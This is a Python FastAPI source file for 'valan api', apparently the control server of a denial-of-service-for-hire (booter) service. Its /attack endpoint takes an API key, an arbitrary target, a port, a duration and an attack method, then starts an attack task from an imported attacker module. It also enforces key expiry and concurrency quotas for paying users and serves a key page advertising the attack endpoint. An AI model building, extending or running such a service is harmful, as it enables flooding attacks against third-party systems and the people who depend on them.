# api.py — valan API (FastAPI)
import asyncio, secrets, time, uvicorn
from fastapi import FastAPI
from fastapi.responses import HTMLResponse, JSONResponse
import db
from config import API_HOST, API_PORT, API_PUBLIC, MAX_CONCURRENT, MAX_TIME
from attacker import run as run_attack, ALL_METHODS

app = FastAPI(title="valan api", docs_url=None, redoc_url=None)
_tasks: dict[str, asyncio.Task] = {}

@app.on_event("startup")
async def _startup():
    db.conn(); db.cleanup_stale()

def _err(msg, code=400):
    return JSONResponse({"status": "error", "message": msg}, status_code=code)

def _validate_key(key):
    row = db.get_key(key)
    if not row: return None, "invalid key"
    _, owner, exp, active = row
    if not active: return None, "key disabled"
    if exp and exp != 0 and exp < int(time.time()): return None, "key expired"
    return row, None

@app.get("/health")
async def health():
    return {"status": "ok", "ts": int(time.time())}

@app.get("/attack")
async def attack(key: str, target: str, port: int,
                 time: int = None, method: str = "GET", t: int = None):
    dur = time if time is not None else t
    if dur is None: return _err("missing time")
    if dur < 1 or dur > MAX_TIME: return _err(f"time must be 1..{MAX_TIME}")
    if port < 1 or port > 65535: return _err("invalid port")
    method = method.upper()
    if method not in ALL_METHODS: return _err(f"unknown method: {method}")

    row, err = _validate_key(key)
    if err: return _err(err, 403)

    active = db.active_count(key)
    if active >= MAX_CONCURRENT:
        return _err(f"concurrency limit ({MAX_CONCURRENT}) reached", 429)

    aid = secrets.token_hex(8)
    db.create_attack(aid, key, target, port, dur, method)
    task = asyncio.create_task(run_attack(aid, key, target, port, dur, method))
    _tasks[aid] = task
    task.add_done_callback(lambda _t, aid=aid: _tasks.pop(aid, None))
    return {
        "status": "started", "id": aid,
        "target": target, "port": port, "time": dur, "method": method,
        "concurrent": active + 1, "max_concurrent": MAX_CONCURRENT,
    }

@app.get("/status")
async def status(id: str):
    row = db.get_attack(id)
    if not row: return _err("not found", 404)
    return {"id": row[0], "key": row[1][:6] + "***", "target": row[2],
            "port": row[3], "time": row[4], "method": row[5],
            "status": row[6], "started_at": row[7], "finished_at": row[8]}

@app.get("/key/{key}", response_class=HTMLResponse)
async def key_page(key: str):
    row = db.get_key(key)
    if not row:
        return HTMLResponse("<h1 style='color:red'>API Key: Invalid</h1>", status_code=404)
    _, owner, exp, active = row
    if not active: stat = "disabled"
    elif exp and exp != 0 and exp < int(time.time()): stat = "expired"
    else: stat = "active"
    exp_str = "ถาวร (TH)" if exp == 0 else time.strftime("%Y-%m-%d %H:%M UTC", time.gmtime(exp))
    color = {"active":"green","expired":"orange","disabled":"red"}[stat]
    return HTMLResponse(f"""
    <html><head><title>valan api key</title><meta name="robots" content="index,follow"></head>
    <body style="font-family:monospace;background:#111;color:#eee;padding:40px">
      <h1>valan api</h1>
      <p>Key: <code>{key[:6]}***</code></p>
      <p>Status: <b style="color:{color}">{stat}</b></p>
      <p>Expires: {exp_str}</p>
      <p>Endpoint: <code>{API_PUBLIC}/attack?key={key}&amp;target=TARGET&amp;port=PORT&amp;time=TIME&amp;method=METHOD</code></p>
      <p>Concurrent: {MAX_CONCURRENT}</p>
    </body></html>
    """)

if __name__ == "__main__":
    uvicorn.run(app, host=API_HOST, port=API_PORT)